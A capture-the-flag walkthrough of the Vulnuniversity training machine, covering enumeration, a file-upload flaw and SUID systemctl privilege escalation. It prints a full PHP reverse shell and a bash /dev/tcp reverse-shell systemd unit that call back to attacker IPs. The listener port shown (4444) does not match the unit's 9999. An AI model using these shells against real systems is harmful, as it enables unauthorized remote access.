---
description: Walk through of the vulnuniversity room
---

# Vulnuniversity

## Full Walk through

### Port scanning

```bash
nmap -sC -sV 10.10.110.48 -p-
```

#### Results:

<figure><img src="../.gitbook/assets/portscan_vuluni.png" alt=""><figcaption><p>Service Enumeration Scan</p></figcaption></figure>

#### Services Found:

* Port 3333: Apache HTTP server (2.4.8)
* Port 3128: Squid proxy server 3.5.12
* Port 22: OpenSSH 7.2p2
* Port 21: vsftpd (FTP server)
* Port 139, 445: SMB over NetBIOS

### Vulnerability scan

```bash
nmap --script vuln 10.10.110.48 -p 3333,3128,22,21,139,445
```

<figure><img src="../.gitbook/assets/smb_dos_vuln.png" alt=""><figcaption><p>Vulnerability scan results</p></figcaption></figure>

### Directory discovery

```bash
gobuster dir --url http://10.10.110.48:3333/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-1.0.txt
```

<figure><img src="../.gitbook/assets/gobuster_internal_dir.png" alt=""><figcaption><p>Gobuster directory brute force</p></figcaption></figure>

We find the `/internal` directory, where we can upload files via the internal upload portal:

<figure><img src="../.gitbook/assets/internal_upload_portal.png" alt=""><figcaption><p>Upload portal</p></figcaption></figure>

### Arbitrary file upload

The internal upload portal, has no authentication and supports arbitrary file upload of `.phtml` files.&#x20;

<figure><img src="../.gitbook/assets/php-rev-shell.png" alt=""><figcaption><p>php reverse shell file </p></figcaption></figure>

### Remote Code Execution

To get a shell access we create the following php-reverse-shell.phtml file to exploit the file upload vulnerability:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.17.30.161';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
```

We can easily execute our `php-reverse-shell.phtml` file by visiting the link `http://10.10.110.48:3333/internal/uploads/php-reverse-shell.phtml`&#x20;

<figure><img src="../.gitbook/assets/execution_rev_shell.png" alt=""><figcaption><p>Execution of uploaded exploit</p></figcaption></figure>

To connect to the reverse shell we create a simple netcat listener using:

```bash
nc -vnlp 4444
```

<figure><img src="../.gitbook/assets/netcat_shell.png" alt=""><figcaption><p>reverse shell in action</p></figcaption></figure>

We can make this shell better by spawning a bash shell with python. This will help us run commands through shell access that is not possible through this reverse shell.

<figure><img src="../.gitbook/assets/good_shell_from_python.png" alt=""><figcaption><p>Python bash shell</p></figcaption></figure>

### Foot holding

The initial access is for the user `www-data`:

<figure><img src="../.gitbook/assets/user_details_www_data.png" alt=""><figcaption><p>foothold</p></figcaption></figure>

<figure><img src="../.gitbook/assets/if_config.png" alt=""><figcaption><p>target ip details</p></figcaption></figure>

### Find who has access to what resources

We can dump the `/etc/passwd` file contents using the user account `www-data`:

<figure><img src="../.gitbook/assets/etc_pass.png" alt=""><figcaption><p>contents of /etc/passwd</p></figcaption></figure>

We find that the user bill has the shell access:

<figure><img src="../.gitbook/assets/bill_user_has_shell_access.png" alt=""><figcaption><p>bill has access to /bin/bash</p></figcaption></figure>

### User FLAG

<figure><img src="../.gitbook/assets/user_flag.png" alt=""><figcaption><p>user  flag</p></figcaption></figure>

### Find files with SUID set

```bash
find / -perm -u=s -type f 2>/dev/null
```

<figure><img src="../.gitbook/assets/systemctl_suid_set.png" alt=""><figcaption><p>systemctl has SUID set</p></figcaption></figure>

We find systemctl has SUID set. So with by enabling a malicious service we can get root shell access.

### Privilege Escalation

Plan is to spawn another reverse shell back to attacker machine with root access. We do this by creating the following `root.service` in the `/tmp` directory because we have write access to it:

```
[Service]
Type=simple
User=root
Execstart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.48.13/9999 0>&1'
```

<figure><img src="../.gitbook/assets/create_root_service.png" alt=""><figcaption></figcaption></figure>

Setup a netcat shell on the above defined service port:

```
nc -vnlp 4444
```

We start this service using:

```
/bin/systemctl enable --now /tmp/root.service
```

<figure><img src="../.gitbook/assets/run_with_systemctl.png" alt=""><figcaption><p>Starting root.service using systemctl</p></figcaption></figure>

We immediately get back the root shell at our netcat listener:

<figure><img src="../.gitbook/assets/root_netcat_shell.png" alt=""><figcaption><p>Netcat listener with root shell</p></figcaption></figure>

### Root FLAG

<figure><img src="../.gitbook/assets/root_flag.png" alt=""><figcaption><p>root FLAG</p></figcaption></figure>
